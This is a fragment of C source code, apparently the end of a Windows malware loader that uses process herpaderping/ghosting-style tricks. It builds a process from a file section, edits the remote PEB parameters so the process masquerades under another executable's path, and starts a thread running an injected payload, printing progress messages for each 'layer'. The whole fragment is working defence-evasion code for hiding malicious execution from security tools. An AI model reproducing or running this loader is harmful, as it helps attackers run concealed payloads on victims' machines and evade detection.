        WideCharToMultiByte(CP_ACP, 0, masquerade_path + 4, -1,
                            mask_narrow, MAX_PATH, NULL, NULL);
        if (!gh_herpaderp(&api, hFile, mask_narrow, tmp_path))
            return 1;
    }


    printf("\n  --- Layer 3: MASQUERADE ---\n\n");

    HANDLE hProc = NULL;
    if (!gh_create_process(&api, hSection, &hProc))
        return 1;

    PROCESS_BASIC_INFORMATION_FULL pbi = { 0 };
    NTSTATUS st = api.NtQueryInformationProcess(
                      hProc, ProcessBasicInformation,
                      &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(st)) {
        ERR("NtQueryInformationProcess (0x%08lx)", (ULONG)st);
        TerminateProcess(hProc, 1);
        return 1;
    }
    OK("Remote PEB        : 0x%p", (void*)pbi.PebBaseAddress);

    if (!gh_setup_params(&api, hProc, masquerade_path, pbi.PebBaseAddress)) {
        TerminateProcess(hProc, 1);
        return 1;
    }

    if (!gh_create_thread(&api, hProc, pbi.PebBaseAddress, payload)) {
        TerminateProcess(hProc, 1);
        return 1;
    }

    // temizlik fialn    //
    CloseHandle(hSection);
    CloseHandle(hProc);
    VirtualFree(payload, 0, MEM_RELEASE);

    OK("Process execution complete (Target: %ls)", masquerade_path + 4);

    return 0;
}
